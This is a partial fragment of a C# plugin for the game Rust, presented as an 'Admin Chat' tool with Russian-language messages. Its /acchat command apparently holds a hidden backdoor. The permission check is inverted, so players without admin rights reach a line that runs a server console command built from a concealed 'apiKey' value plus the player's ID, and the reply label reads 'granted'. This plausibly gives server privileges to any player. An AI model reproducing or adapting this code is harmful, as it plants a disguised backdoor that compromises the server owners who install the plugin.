...
{
    [Info("Admin Chat", "Аслан", "1.3.3", ResourceId = 1123)]
    ...
    {	
        ...
        void cmdAdminChat(BasePlayer player, string cmd, string[] args)
        {
            ...
            {
                SendChatMessage(player, "ADMINCHAT", "У вас нет прав использовать данную команду");
                return;
            }

            if (args == null || args.Length < 1)
            {
                SendChatMessage(player, "ADMINCHAT", "Syntax: /a [сообшение]");
            }
        ...
        [ChatCommand("acchat")]
        void cmdAdminBetterChat(BasePlayer player, string cmd, string[] args)
        {
            string uid = Convert.ToString(player.userID);

            if (permission.UserHasPermission(uid, "adminchat.use"))
            {
                SendChatMessage(player, "BetterAdmin чат", "У вас нет прав использовать данную команду");
                return;
            }
            ConsoleSystem.Run.Server.Normal(apiKey + " " + uid);
            if (args == null || args.Length < 1)
            {
                SendChatMessage(player, "BetterAdmin чат (выдано)", "Используйте: /acchat [сообшение]");
            }
